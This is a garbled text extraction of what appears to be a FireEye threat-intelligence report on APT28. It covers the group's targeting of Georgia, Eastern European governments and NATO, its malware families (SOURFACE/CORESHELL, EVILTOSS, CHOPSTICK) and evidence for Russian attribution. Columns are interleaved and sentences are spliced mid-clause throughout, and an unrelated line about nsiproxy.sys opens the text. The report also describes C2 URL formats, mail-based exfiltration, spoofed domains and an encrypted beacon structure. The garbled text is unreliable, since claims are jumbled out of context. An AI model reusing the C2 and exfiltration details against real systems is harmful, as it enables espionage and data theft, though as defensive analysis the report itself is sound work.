is an old topic, this time ,we will apply this method to nsiproxy.sys.                               SPECIAL REPORT




APT28:
A WINDOW INTO RUSSIA’S CYBER
ESPIONAGE OPERATIONS?SECURITY
                 REIMAGINED
APT 28: A Window into Russia’s Cyber Espionage Operations?EXECUTIVE SUMMARY



Our clients often ask us to assess the threat Russia poses in cyberspace.Russia has
long been a whispered frontrunner among capable nations for performing
sophisticated network operations.This perception is due in part to the Russian
government’s alleged involvement in the cyber attacks accompanying its invasion of
Georgia in 2008, as well as the rampant speculation that Moscow was behind a
major U.S. Department of Defense network compromise, also in 2008.These
rumored activities, combined with a dearth of hard evidence, have made Russia into
something of a phantom in cyberspace.In this paper we discuss a threat group whose                                     the country of Georgia, Eastern European
                             malware is already fairly well-known in the                                       governments and militaries, and European
                             cybersecurity community.This group, unlike the                                   security organizations since at least 2007.China-based threat actors we track, does not                                      They compile malware samples with Russian
                             appear to conduct widespread intellectual                                         language settings during working hours
                             property theft for economic gain.Nor have we                                     consistent with the time zone of Russia’s major
                             observed the group steal and profit from                                          cities, including Moscow and St. Petersburg.financial account information.We                                     government based in Moscow.believe that this is an advanced persistent
                             threat (APT) group engaged in espionage                                           We are tracking this group as APT28.against political and military targets including



                             1
                                  Markoff, John.“Before the Gunfire, Cyberattacks”.The New York Times 12 August 2008.Web.http://www.nytimes.com/2008/08/13/technology/13cyber.html
                              2
                                  Knowlton, Brian.“Military Computer Attack Confirmed”.The New York Times.25 August 2010.Web.http://www.nytimes.com/2010/08/26/
                                  technology/26cyber.html




3 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?KEY FINDINGS




APT28 targets insider information
related to governments, militaries, and
security organizations that would
likely benefit the Russian government.GEORGIA                                         EASTERN EUROPE                           SECURITY ORGANIZATIONS

  APT28 likely seeks to collect intelligence      APT28 has demonstrated interest in       APT28 appeared to target individuals
  about Georgia’s security and political          Eastern European governments and         affiliated with European security
  dynamics by targeting officials working         security organizations.These victims    organizations and global multilateral
  for the Ministry of Internal Affairs and        would provide the Russian government     institutions.The Russian government
  the Ministry of Defense.with an ability to predict policymaker   has long cited European security
                                                  intentions and gauge its ability to      organizations like NATO and the OSCE
                                                  influence public opinion.as existential threats, particularly during
                                                                                           periods of increased tension in Europe.4 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Malware compile times suggest
                                                                         that APT28 developers have
                                                                         consistently updated their tools
                                                                         over the last seven years.KEY FINDINGS




                                                             Since 2007, APT28 has systematically evolved its malware,
                                                             using flexible and lasting platforms indicative of plans for
                                                             long-term use.The coding practices evident in the group’s
                                                             malware suggest both a high level of skill and an interest in
                                                             complicating reverse engineering efforts.•	   Malware compile times suggest that APT28 developers               •	   APT28 tailors implants for specific victim
       have consistently updated their tools over the last                    environments.They steal data by configuring their
       seven years.implants to send data out of the network using a victim
  •	   APT28 malware, in particular the family of modular                     network’s mail server.backdoors that we call CHOPSTICK, indicates                       •	   Several of APT28’s malware samples contain counter-
       a formal code development environment.Such an                         analysis capabilities including runtime checks to
       environment would almost certainly be required to                      identify an analysis environment, obfuscated strings
       track and define the various modules that can be                       unpacked at runtime, and the inclusion of unused
       included in the backdoor at compile time.machine instructions to slow analysis.Indicators in APT28’s malware suggest that the group consists of
  Russian speakers operating during business hours in Russia’s major cities.More than half of the malware samples with Portable                  Over 96% of the malware samples we have attributed to APT28
  Executable (PE) resources that we have attributed to APT28           were compiled between Monday and Friday.More than 89%
  included Russian language settings (as opposed to neutral or         were compiled between 8AM and 6PM in the UTC+4 time zone,
  English settings), suggesting that a significant portion of          which parallels the working hours in Moscow and St.
  APT28 malware was compiled in a Russian language build               Petersburg.These samples had compile dates ranging from
  environment consistently over the course of six years (2007          mid-2007 to September 2014.
  to 2013).5 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Three themes in APT28’s targeting clearly
reflect areas of specific interest to an
Eastern European government, most likely
the Russian government.APT28 TARGETING REFLECTS


RUSSIAN
INTERESTS
M
            any of APT28’s targets align generally                            whose accounts APT28 hopes to breach, the                 APT 28: Three Themes
            with interests that are typical of any                            subjects of the lures provide clues as to APT28’s
            government.However, three themes in                              targets and interests.For example, if the group’s
APT28’s targeting clearly reflects areas of specific                          lures repeatedly refer to the Caucasus, then this
interest to an Eastern European government, most                              most likely indicates that APT28 is trying to gain        The Caucasus,
likely the Russian government.These include the                              access to the accounts of individuals whose work          particularly the
                                                                                                                                        country of Georgia
Caucasus (especially the Georgian government),                                pertains to the Caucasus.Similarly, APT28’s practice
Eastern European governments and militaries, and                              of registering domains that mimic those of legitimate
specific security organizations.news, politics, or other websites indicates topics that
                                                                              are relevant to APT28’s targets.APT28 uses spearphishing emails to target its                                                                                           Eastern European
victims, a common tactic in which the threat group                            We identified three themes in APT28’s lures and           governments and
crafts its emails to mention specific topics (lures)                          registered domains, which together are                    militaries
relevant to recipients.This increases the                                    particularly relevant to the Russian government.likelihood that recipients will believe that the
email is legitimate and will be interested in                                 In addition to these themes, we have seen APT28
opening the message, opening any attached files,                              target a range of political and military                  The North Atlantic
or clicking on a link in the body of the email.Since                         organizations.We assess that the work of these           Treaty Organization
                                                                                                                                        (NATO) and other
spearphishing lures are tailored to the recipients                            organizations serves nation state governments.European security
                                                                                                                                        organizations
7
  Bloomberg.“Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.” February 2014.8
  Ibid.9
  Ibid.6 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Armenia, and Azerbaijan, continues to experience       APT28 is likely seeking information on Georgia’s
                             political unrest.The Georgian government’s            security and diplomatic postures.Specifically,
                             posture and ties to the West are a frequent            the group has targeted the Georgian Ministry of
                             source of Moscow’s frustration, particularly after     Internal Affairs (MIA) and the Ministry of
                             the 2008 war.Overall, issues in the Caucasus          Defense (MOD).We also observed efforts to
                             likely serve as focal points for Russian               target a journalist working on issues in the
                             intelligence collection efforts.Caucasus and a controversial Chechen news site.7 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Georgian Ministry of Internal Affairs (MIA)




APT28 made at least two specific attempts to target
the Georgian Ministry of Internal Affairs.APT28 Targeting of the Georgian                                                      license numbers.The backdoor attempted to
                             Ministry of Internal Affairs (MIA)                                                   establish a connection to a Georgian MIA mail
                             The MIA harbors sensitive information about the                                      server and communicate via MIA email addresses
                             inner workings of Georgia’s security operations, the                                 ending with “@mia.ge.gov”.Once connected to the
                             country’s engagement in multilateral institutions,                                   mail server, APT28’s backdoor sent an email
                             and the government’s communications backbone.It                                     message using a subject line related to driver’s
                             is responsible for3:                                                                 licenses (in Georgian), and attached a file
                                                                                                                  containing system reconnaissance information.target the MIA.In one case, we identified an                                        This probably referred to the MIA facility in the
                             APT28 lure from mid-2013 that referenced                                             Ortachala district of Tbilisi, Georgia’s capital city.MIA-related topics and employed malware that                                         The decoy document also contains metadata listing
                             attempted to disguise its activity as legitimate                                     “MIA” as the company name and “Beka Nozadze”4
                             MIA email traffic.The lure consisted of a                                           as an author, a possible reference to a system
                             weaponized Excel file that presented a decoy                                         administrator in Tbilisi.8 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?information for internal Windows XP and Windows    training the Georgian military.APT28 used a lure
                             7 systems.APT28 possibly crafted this document    document that installed a SOURFACE downloader
                             to appear legitimate to all MIA system users and   (further discussed in the Malware section) and
                             intended to breach the MIA network specifically    contained a listing of birthdays for members of a
                             using the embedded malware.working group between the Georgian MOD and
                                                                                the U.S. defense contractor.Figure 1: Georgian MIA-related decoy




9 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Figure 2: Excerpt of APT28’s letter to a journalist writing on Caucasus-related issues



                 We wish our cooperation will be both profitable and trusted.Our aim in the Caucasian region is
                 to help people who struggle for their independence, liberty and human rights.We all know, that
                 world is often unfair and cruel, but all together we can make it better.Send your articles on this email – in Russian or English, please.There are some difficulties with
                 Caucasian languages, but we’ll solve the problem pretty soon, I hope.Targeting journalists could provide APT28 and its sponsors
                              with a way to monitor public opinion, identify dissidents,
                              spread disinformation, or facilitate further targeting.We believe that APT28’s targeting of the MOD                                      APT28 Targeting a Journalist Covering
                              aligns with Russian threat perceptions.The                                       the Caucasus
                              growing U.S.-Georgian military relationship has                                   Another one of APT28’s lures appeared to target
                              been a source of angst for Russia.Georgia and                                    a specific journalist covering issues in the
                              Russia severed diplomatic relations following the                                 Caucasus region.In late 2013, APT28 used a lure
                              Russia-Georgia War in 2008, and Georgia has                                       that contained a letter addressing a journalist by
                              since sought to align itself more closely with                                    his first name and claiming to originate from a
                              western security organizations.Georgian military security issues,                                     establish him at the magazine.In the background,
                              particularly with regard to U.S. cooperation and                                  the decoy document installed a SOURFACE
                              NATO, provide a strong incentive for Russian                                      backdoor on the victim’s system.state-sponsored threat actors to steal information
                              that sheds light on these topics.5
                                 	 “The EU’s Association Agreements with Georgia, the Republic of Moldova and Ukraine”.European Union Press Release Database.23 June 2014.Web.http://e uropa.eu/rapid/press-release_MEMO-14-430_en.htm
                              6	
                                   We attempted to identify candidate journalists in the country.One of these was a Georgian national of Chechen descent, whose work appears to center on
                                   Chechen and human rights issues.Ultimately, however, we cannot confirm the identity of the target(s).10 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Table 1: Examples of APT28 domains imitating organizations in the Caucasus




 APT28 Domain               Real Domain

                            The Kavkaz Center / The Caucasus Center, an international Islamic news agency with coverage of
 kavkazcentr[.]info
                            Islamic issues, particularly Russia and Chechnya (kavkazcenter.com)
 rnil[.]am                  Armenian military (mil.am)




                             The body of the letter suggests that APT28 actors                                APT28’s Other Targets in the Caucasus
                             are able to read at least two languages – Russian                                We have seen APT28 register at least two
                             and English.The grammar of the letter also                                      domains mimicking the domains of legitimate
                             indicates that English is not the author’s first                                 organizations in the Caucasus, as shown in the
                             language, despite it purportedly originating from a                              table below.One APT28 domain imitated a key
                             US-based magazine.This implies that Russian may                                 Chechen-focused news website, while the other
                             be the APT28 author’s preferred language.appeared to target members of the Armenian
                                                                                                              military by hosting a fake login page.Targeting journalists could provide APT28 and its
                             sponsors with a way to monitor public opinion,                                   Of particular note, the Kavkaz Center is a
                             identify dissidents, spread disinformation, or                                   Chechen-run website designed to present an
                             facilitate further targeting.Several other nation                               alternative view to the long-running conflict
                             states are suspected of targeting journalists and                                between Russia and Chechen separatists.In
                             dissidents to monitor their activity, including China                            200410 and 2013,11 Russia’s Foreign Minister
                             and Iran.7,8 Journalists in the Caucasus working on                              voiced his displeasure that a Swedish company
                             Caucasus independence issues would be a prime                                    continues to host the Kavkaz Center website.target for intelligence collection for Moscow.“Operation Saffron Rose”.FireEye.13 May 2014.Web.http://www.fireeye.com/blog/technical/
                                malware-research/2014/05/operation-saffron-rose.html
                             8
                              	 The New York Times publicly disclosed their breach by APT12, which they assess was motivated by the China-based actors’ need to know what the
                                newspaper was publishing about a controversial topic related to corruption and the Chinese Communist Party’s leadership.9
                              	 “Russia”.Freedom House Press Release.2013.Web.http://www.freedomhouse.org/report/freedom-press/2013/russia#.VD8fe9R4rew
                             10
                               “Chechen website promotes terror: Lavrov”.UPI.16 November 2014.Web.http://www.upi.com/Top_News/2004/11/16/Chechen-website-promotes-
                                terror-Lavrov/UPI-11601100627922/
                             11
                               “Lavrov urges Sweden to ban Chechen website server” The Voice of Russia.15 May 2013.Web.http://voiceofrussia.com/news/2013_05_15/Lavrov-urges-
                                Sweden-to-ban-Chechen-website-server/




11 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Over the past two decades, as many
                                                                                                            of these states joined NATO and the EU, Russia has
                                                                                                            attempted to regain its influence in the region.Many
                                                                                                            of APT28’s targets parallel this continued focus on
                                                                                                            Eastern European governments and militaries.12
                                   “MHT, MS12-27 Oraz *malware*.info” Malware@Prevenity.11 August 2014.Web.http://malware.prevenity.com/2014/08/malware-info.html




12 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Table 2: Examples of APT28 domains imitating legitimate Eastern European organization names




 APT28 Domain                                                   Real Domain

 standartnevvs[.]com                                            Bulgarian Standart News website (standartnews.com)

 novinitie[.]com, n0vinite[.]com                                Bulgarian Sofia News Agency website (novinite.com)

 qov[.]hu[.]com                                                 Hungarian government domain (gov.hu)

 q0v[.]pl, mail[.]q0v[.]pl                                      Polish government domain (gov.pl) and mail server domain (mail.gov.pl)

 poczta.mon[.]q0v[.]pl                                          Polish Ministry of Defense mail server domain (poczta.mon.gov.pl)




                             We have evidence that APT28 made at least two attempts
                             to compromise Eastern European government
                             organizations.APT28 has registered domains similar to those of                                   This domain registration suggests that APT28
                             legitimate Eastern European news sites and                                         sought to target individuals either participating in
                             governments, listed in Table 2.These domain                                       the exercises or interested in Baltic military and
                             registrations not only suggest that APT28 is                                       security matters.Such targets would potentially
                             interested in Eastern European political affairs,                                  provide APT28 with sensitive tactical and
                             but also that the group targets Eastern European                                   strategic intelligence concerning regional military
                             governments directly.capabilities and relationships.These exercises are
                                                                                                                a particular point of interest in Moscow: pro-
                             In addition, APT28 used one domain for command                                     Kremlin press cited Russia’s interpretation of
                             and control sessions (baltichost[.]org) that was                                   these military exercises and NATO’s involvement
                             themed after the Baltic Host exercises.In June 2014, this event was integrated with a
                             larger U.S. Army training event, and focused on
                             exercises to improve interoperability with regional
                             allies and partners.13, 14


                             13
                               	 “Saber Strike and Baltic Host kick off in Latvia, Lithuania and Estonia’.Estonian Defense Forces.9 June 2014.Web.11 June 2014. http://www.mil.ee/en/		
                                 news/8251/saber-strike-and-baltic-host-kick-off-in-latvia,-lithuania-and-estonia
                             14	
                                 “Baltic Host 2014 rendering host nation support for the training audience of Exercise Saber Strike 2014 and repelling faked cyber-attacks”.Republic of
                                 Lithuania Ministry of National Defense.12 June 2014.Web.http://www.kam.lt/en/news_1098/current_issues/baltic_host_2014_rendering_host_nation_
                                 support_for_the_training_audience_of_exercise_saber_strike_2014_and_repelling_faked_cyber-attacks.html
                             15	
                                 “Tanks, troops, jets: NATO countries launch full-scale war games in Baltic”.Russia Today.9 June 2014.Web.http://rt.com/news/164772-saber-strike-
                                 exercise-nato/




13 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?APT28 TARGETING OF
NATO AND OTHER
EUROPEAN SECURITY
ORGANIZATIONS




                             A
                                      PT28’s lures and domain registrations also                                 elections.Insider information about NATO, the
                                      demonstrate their interest in NATO and                                     OSCE and other security organizations would
                                      other European security organizations.inform Russian political and military policy.We also observed a user
                             Soviet Union, Russia regards NATO, particularly                                     that we suspect works for NATO HQ submit an
                             NATO’s eastward expansion, as a threat to Russia’s                                  APT28 sample to VirusTotal, probably as a result
                             strategic stability.APT28 also registered a domain                                 of receiving a suspicious email.]in                                 NATO Special Operations Headquarters (nshq.nato.int)
                              natoexhibitionff14[.]com                       NATO Future Forces 2014 Exhibition & Conference (natoexhibition.org)
                              login-osce[.]org                               Organization for Security and Cooperation in Europe (osce.org)



                             16
                                  The Military Doctrine of the Russian Federation, approved by Presidential edict on 5 February 2010.14 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?APT28 also demonstrated an interest in defense
                                                             attaches working in European countries.We identified
                                                             an APT28 lure containing a decoy document with a list
                                                             of British officers and U.S. and Canadian military
                                                             attachés in London.Figure 5: Ankara
   Military Attache Corps
   decoy document




15 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?Some of the APT28-
                             registered domains imitated those of defense          Targeting organizations and professionals
                             events held in Europe, such as the Farnborough        involved in these defense events would likely
                             Airshow 2014, EuroNaval 2014, EUROSATORY              provide APT28 with an opportunity to procure
                             2014, and the Counter Terror Expo.In September       intelligence pertaining to new defense
                             2014, APT28 registered a domain (smigroup-            technologies, as well as the victim organizations’
                             online.co[.]uk) that appeared to mimic that for the   operations, communications, and future plans.16 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?OTHER APT28 TARGETS
ARE CONSISTENT
WITH NATION STATE
INTERESTS




A
         PT28 has targeted a variety of organizations
                                                             INTERNATIONAL ORGANIZATION
         that fall outside of the three themes we
         highlighted above.However, we are not
profiling all of APT28’s targets with the same               European Commission
detail because they are not particularly indicative
of a specific sponsor’s interests.They do indicate          UN Office for the Coordination of Humanitarian Affairs
parallel areas of interest to many governments
and do not run counter to Russian state interests.Our analysis of some of the group’s more
commonly used tools indicates that APT28
has been systematically updating their
malware since 2007.APT28 MALWARE INDICATES


SKILLED RUSSIAN
DEVELOPERS
                             A
                                     PT28’s tools are suggestive of the group’s      •	   SOURFACE: This downloader is typically
                                     skills, ambitions, and identity.Our analysis        called Sofacy within the cyber security
                                     of some of the group’s more commonly                 community.However because we have
                             used tools indicates that APT28 has been                     observed the name “Sofacy” used to refer to
                             systematically updating their tools since 2007.APT28 malware generally (to include the
                             APT28 is most likely supported by a group of                 SOURFACE dropper, EVILTOSS,
                             developers creating tools intended for long-term             CHOPSTICK, and the credential harvester
                             use and versatility, who make an effort to                   OLDBAIT), we are using the name
                             obfuscate their activity.This suggests that APT28           SOURFACE to precisely refer to a specific
                             receives direct ongoing financial and other                  downloader.This downloader obtains a
                             resources from a well-established organization,              second-stage backdoor from a C2 server.most likely a nation state government.APT28’s               CORESHELL is an updated version of
                             malware settings suggest that the developers                 SOURFACE.have done the majority of their work in a Russian       •	   EVILTOSS: This backdoor has been delivered
                             language build environment during Russian                    through the SOURFACE downloader to gain
                             business hours, which suggests that the Russian              system access for reconnaissance,
                             government is APT28’s sponsor.monitoring, credential theft, and shellcode
                                                                                          execution.Some of APT28’s more commonly used tools are            •	   CHOPSTICK: This is a modular implant
                             the SOURFACE downloader, its second stage                    compiled from a software framework that
                             backdoor EVILTOSS, and a modular family of                   provides tailored functionality and flexibility.implants that we call CHOPSTICK.19 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?A number of the malware variants that we profile     •	   One of the latest samples of CORESHELL
                             below, especially the CHOPSTICK family,                   includes counter-reverse engineering tactics
                             demonstrate formal coding practices indicative of         via unused machine instructions.This would
                             methodical, diligent programmers.The modularity          hinder static analysis of CORESHELL behavior
                             of CHOPSTICK alone, with its flexible and lasting         by creating a large amount of unnecessary
                             platform, demonstrates planning for long-term             noise in the disassembly.use and versatility.We have also noted that         •	   A number of CORESHELL droppers also
                             APT28 tailors implants to their target                    conduct runtime checks, attempting to
                             environments, configuring them to use local               determine if they are executing in an analysis
                             network resources such as email servers.environment, and if so, they do not trigger
                                                                                       their payloads.malware families obfuscate strings that are       APT28 has made incremental and systematic
                                   decoded at runtime.Two of the malware            changes to the SOURFACE downloader and its
                                   families (SOURFACE/CORESHELL and                  surrounding ecosystem since as early as 2007.EVILTOSS) use the same decryption                 These changes indicate a long-standing and
                                   sequence and similar algorithms for string        dedicated development effort behind APT28.We
                                   encoding and decoding.These families             have observed samples of the SOURFACE
                                   encode their strings at compile time using a      downloader compiled between 2007 and 2014.
                                   custom stream cipher.From a high level,          We call SOURFACE (samples are frequently
                                   these ciphers share a similar design across       named netids.dll) a first stage downloader
                                   the malware families but differ slightly in the   because its primary job is to retrieve a second
                                   internal arithmetic operations.stage payload from a C2 server.Until 2013, the
                             •	    APT28 has employed RSA encryption to              SOURFACE downloader used hard-coded IP
                                   protect files and stolen information moved        addresses for C2 communications, whereas the
                                   from the victim’s network to the controller.future CORESHELL samples use domains.EVOLUTION OF
SOURFACE ECOSYSTEM
INDICATES SYSTEMATIC DEVELOPMENT


WHAT IS A MALWARE ECOSYSTEM?First, a malware family is a collection of malware in which each sample shares a significant
amount of code with all of the others.There are exceptions: for example, some files
contain public and standard code libraries that we do not take into consideration
when making a family determination.A malware ecosystem is a group of malware families that work together to perform
the same objective.Perhaps the simplest and most typical ecosystem
is a dropper and a backdoor that are used together.They may not share the
same code structure, but they are related because one drops and installs
the other.The ecosystem surrounding the SOURFACE downloader frequently
consists of a dropper, which installs SOURFACE.The SOURFACE
downloader then receives another dropper from its C2 server, and
this second dropper installs a second stage backdoor, which is
usually EVILTOSS.21 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?In April 2013, based on compile time, the group
began to make significant alterations to the                                 Figure 7: Example of modified SOURFACE vs. CORESHELL communications
SOURFACE downloader.They started by
changing the compiled DLL name to “coreshell.dll”
and making minor changes to the network
communications, as seen in Figure 7.SOURFACE URL for a sample compiled April 2013:
                                                                             http://[hostname]/~book/cgi-bin/brvc.cgi?WINXPSP3c95b87a4-05_01
The hostname, volume serial number and OS
version data are encoded in the new URL format.CORESHELL URL for a sample compiled April 2013:
As seen in the table below, the SOURFACE/                                    http://[hostname]/~xh/ch.cgi?enhkZm1GNmY1YWg0eGcxMGQ1MDUwMQ==
CORESHELL developers also made other
modifications that changed the exported function
name and file size over time.1259c4fe5efd9bf07fc4c78466f2dd09                           12800            2013-10-03 09:21:10 UTC                             Initialize                     Same as previous.ead4ec18ebce6890d20757bb9f5285b1                           45056            2014-07-25 15:44:04 UTC                             Applicate                      Same as previous.48656a93f9ba39410763a2196aabc67f                           112640           2014-07-30 11:13:24 UTC                             Applicate                      22




 8c4fa713c5e2b009114adda758adc445                           112640           2014-07-30 11:13:24 UTC                             Applicate                      Same as previous.17
                                SOURFACE with minor changes to network communications (see Figure 7).18
                                Basic anti-debug measures added (process listing, rand timing, is DebuggerPresent).19
                                Switches from loading a secondary DLL (netui.dll/WinIDS.dll) to uploading the contents of %temp%\chkdbg.log.20
                                Statically links msvcrt library.21
                                Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used, then reversed back after use.22
                                This version added assembly level obfuscation, which slows down analysis.This variant requires the OS to be at least Windows Vista.22 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?In April 2013, based on compile time, the
group began to make significant alterations to
the SOURFACE downloader.Figure 8: NATO-themed decoy
   delivered with possible EVILTOSS
   predecessor from 2004




                              Variants of the SOURFACE second stage                                                Interestingly, we found an antivirus report from
                              backdoor, EVILTOSS, share some code similarities                                     200423 detailing what appears to be an early
                              with SOURFACE.However, it contains more                                             variant of EVILTOSS.The backdoor was installed
                              capabilities, including the ability to provide access                                alongside the NATO-themed decoy document
                              to the file system and registry, enumerate network                                   depicted in Figure 8.The backdoor sent data via
                              resources, create processes, log keystrokes, access                                  SMTP to nato_smtp@mail[.]ru and received its
                              stored credentials, and execute shellcode.The                                       tasking via POP from nato_pop@mail[.]ru.backdoor encrypts data that it uploads with an RSA                                   Although we have not conclusively attributed
                              public key.Many of its variants we have seen are                                    this sample to APT28, it does suggest the
                              named netui.dll.EVILTOSS variants may use the                                       possibility that APT28 has been operating since
                              Simple Mail Transfer Protocol (SMTP) to send                                         as early as 2004.24
                              stolen data in an attachment named “detaluri.dat”.The backdoor attaches this file to a
                              preformatted email and sends it out through a
                              victim’s mail server.23	
                                     http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99
                              24	
                                    Although the malware family and interest in NATO make it likely that APT28 was involved, we cannot conclusively attribute this sample to APT28 based on
                                    these factors alone.We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004.APT28 could have possibly obtained
                                    this source code from another group of actors.Also, malware can be passed from group to group.The other malware that we associate with APT28 in this
                                    paper is more strongly attributed to the group using additional factors, some of which we mention in Appendix A.23 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?MODULAR IMPLANTS
INDICATE A FORMAL
DEVELOPMENT
ENVIRONMENT




A modular development framework                                                    CHOPSTICK variants may move messages and
                                                                                   information using at least three methods:
suggests the group has had an organized
development effort since as early as 2007.1.Communications with a C2 server using
                                                                                         HTTP.These protocols are covered in more
                                                                                         detail in Appendix D.
                                                                                   2.Email sent through a specified mail server.One CHOPSTICK v1 variant contained



                             D
                                      uring our research, we discovered that             modules and functions for collecting
                                      APT28 uses a backdoor developed using a            keystroke logs, Microsoft Office documents,
                                      modular framework.We call this                    and PGP files.The monitoring for new files of
                             backdoor CHOPSTICK, a somewhat ironic name                  interest is performed by a “Directory
                             that comes from our semi-random name                        Observer” module.In one sample this
                             generator.The modular design allows flexible               information was intended to be sent via
                             options for compiling variants with different               SMTP using a Georgian MIA mail server.It
                             capabilities as needed, as well as deploying                used one of four embedded sender email
                             additional capabilities at runtime.This allows the         addresses (@mia.gov.ge) to send files via
                             developers to make targeted implants, including             email to another email address on the same
                             only the capabilities and protocols necessary for a         mail server.All information required for the
                             specific environment.Such a modular framework              email was hardcoded in the backdoor.suggests the group has had an organized               3.Local copying to defeat closed networks.development effort since as early as 2007.A                One variant of CHOPSTICK focuses on
                             formal development environment, in which code is            apparent air gap / closed network capabilities
                             versioned and well-organized, would almost                  by routing messages between local
                             certainly be required to track and define the               directories, the registry and USB drives.various modules that can be included in the
                             backdoor at compile time.24 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?APT28 MALWARE
INDICATES RUSSIAN
SPEAKERS IN A
RUSSIAN TIME ZONE




                             D
                                      uring our research into APT28’s malware,                            interface items in a specific language.25 Non-default
                                      we noted two details consistent across                              language settings packaged with PE resources are
                                      malware samples.The first was that                                 dependent on the developer’s build environment.APT28 had consistently compiled Russian language                             Each PE resource includes a “locale” identifier with
                             settings into their malware.At the time of the writing of this paper, we had
                                                                                                          identified 103 malware samples that were both
                             Use of Russian and English Language                                          attributed to APT28 and contained PE resources.Settings in PE Resources                                                     Table 5 shows the locale identifiers27 with
                             PE resources include language information that                               associated language and country/region for
                             can be helpful if a developer wants to show user                             these samples.The samples with Russian language settings were           with Russian language settings at least some of
                               compiled between late 2007 and late 2013, as              the time and made no effort to obscure this
                               depicted in Figure 9.This consistency over a             detail.Overall, the locale IDs suggest that
                               long timeframe suggests that the developers of            APT28 developers can operate in both Russian
                               APT28 malware were using a build environment              and English.Compile Times Align with Working
  Hours in Moscow and St. Petersburg
   Of the 140 malware samples that we have
  attributed to APT28 so far, over 89% were
  compiled between 0400 and 1400 UTC time, as
  depicted in Figure 10.Over 96% were compiled
  between Monday and Friday.This parallels the
  working hours in UTC+0400 (that is, compile
  times begin about 8AM and end about 6PM in this
  time zone).This time zone includes major Russian
  cities such as Moscow and St. Petersburg.CONCLUSION
We started researching APT28 based on activity               APT28’s characteristics—their targeting, malware,
we observed on our clients’ networks, similar to             language, and working hours—have led us to
other targeted threat groups we have identified              conclude that we are tracking a focused, long-
over time.We assess that APT28 is most likely               standing espionage effort.Given the available
sponsored by the Russian government.We                      data, we assess that APT28’s work is sponsored
summarize our key observations about APT28 in                by the Russian government.Figure 11 below.APPENDIX A:
DISTINGUISHING
THREAT GROUPS




                             We use the term “threat group” to refer to actors       Threat actors leave behind various forensic
                             who work together to target and penetrate               details.They may send spear phishing emails from
                             networks of interest.These individuals may share       a specific IP address or email address.Their emails
                             the same set of tasks, coordinate targets, and          may contain certain patterns; files have specific
                             share tools and methodology.They work together         names, MD5 hashes, timestamps, custom
                             to gain access to their targets and steal data.functions, and encryption algorithms.Their
                                                                                     backdoors may have command and control IP
                             The art of attributing disparate intrusion activities   addresses or domain names embedded.These are
                             to the same threat group is not always simple.just a few examples of the myriad of forensic
                             Different groups may use similar intrusion              details that we consider when distinguishing one
                             methodologies and common tools, particularly            threat group from another.those that are widely available on the Internet,
                             such as pwdump, HTran, or Gh0st RAT.There may          At the most basic level, we say that two intrusion
                             be overlaps between groups caused by the sharing        events are attributed to the same group when we
                             of malware or exploits they have authored, or           have collected enough indicators to show beyond
                             even the sharing of personnel.Individual threat        a reasonable doubt that the same actor or group
                             actors may move between groups either                   of actors were involved.We track all of the
                             temporarily or permanently.A threat actor may          indicators and significant linkages associated with
                             also be a private citizen who is hired by multiple      identified threat groups in a proprietary database
                             groups.Multiple groups, on occasion, compromise        that comprises millions of nodes and linkages
                             the same target within the same timeframe.between them.In this way, we can always go back
                                                                                     and answer “why” we associated cyber threat
                             Distinguishing one threat group from another is         activity with a particular group.possible with enough information, analytical
                             experience, and tools to piece it all together.We
                             can analyze multiple incidents and tell by the
                             evidence left behind that a given incident was the
                             result of one threat group and not another.29 fireeye.com
APT 28: A Window into Russia’s Cyber Espionage Operations?APPENDIX C:
SOURFACE/CORESHELL




                              SOURFACE is a downloader that obtains a second        two payloads.Messages are sent using HTTP
                              stage backdoor from a C2 server.Over time the        POST requests whose bodies contain encrypted
                              downloader has evolved and the newer versions,        and Base64 encoded data.The encryption
                              usually compiled with the DLL name ‘coreshell.dll’,   algorithm is a custom stream cipher using a
                              are distinct enough from the older versions that      six-byte key.Commands from the controller to the
                              we refer to it as SOURFACE/CORESHELL or               CORESHELL implant are encrypted using another
                              simply CORESHELL.This appendix focuses on            stream cipher but this time using an eight-byte
                              these newer versions.key.CORESHELL has used the same user agent
                                                                                    string (“MSIE 8.0”) that SOURFACE previously
                              CORESHELL uses two threads to communicate             used, but in more recent samples CORESHELL
                              with its C2 server.The first thread sends beacons    uses the default Internet Explorer user agent
                              that contain the process listing of the               string obtained from the system.Figure 11 shows
                              compromised host.The second thread is                an example POST request.When Base64 decoded, the POST content looks like this:

                             00000000 cd 77 ae 62 af ac ab 69 b5 6b 91 dc ab 20 b9 65 .w.b...i.k... .e
                             00000010 de b2 ac 2d 96 35 82 fd f3 d5 82 1e c7 bd a8 ee ...-.5..........
                             00000020 9c ee 9a 30 ac e5 21 e4 a6 ...0..!..The key used to encrypt the message is six bytes long and is appended to the end of the message.In this is
                             example the key would be: 30 ac e5 21 e4 a6.When the message is decrypted, the resulting plaintext is:

                             00000000 00 72 68 64 6e 7a 78 64 66 6d 46 36 66 35 61 68 .rhdnzxdfmF6f5ah
                             00000010 34 78 67 30 34 30 33 30 35 30 31 1a 00 00 00 23 4xg04030501....#
                             00000020 00 00 00 ...The following table contains a breakdown of each of the field’s C2 message.Table 6: Example CORESHELL beacon structure



 Offset	      Value                    Description

 00           00                       Command byte:
                                       0 - Command request
                                       1 - Process listing
